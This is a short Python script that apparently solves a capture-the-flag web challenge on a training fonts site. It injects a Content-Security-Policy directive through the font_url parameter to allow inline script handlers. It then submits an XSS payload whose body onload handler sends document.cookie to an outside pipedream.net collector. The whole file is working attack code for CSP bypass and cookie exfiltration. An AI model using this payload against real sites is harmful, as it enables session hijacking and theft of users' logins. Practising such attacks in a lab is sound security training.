import requests
import string
import random
import re


url = "http://fonts.training.offdef.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		print(search.group())
	  
def try_font(s, font_url, font_name, text):
	params = {
			"font_url": font_url,
			"font_name": font_name,
			"text": text
		}
	return s.get(url+"/try_font", params=params)

def share_font(s, font_url, font_name, text):
	data = {
		"font_url": font_url,
		"font_name": font_name,
		"text": text
	}
	return s.post(url+"/share", data=data)

s = requests.Session()
font_url = "wow; script-src-attr 'self' 'unsafe-inline'"
font_name = "wow"
text = "<body onload=\"window.location.href = 'https://en1g8yz8dx4ai.x.pipedream.net?data=' + document.cookie\">iao</body>"

r = share_font(s, font_url, font_name, text)

print(r.status_code)
print(r.url)
print(r.text)

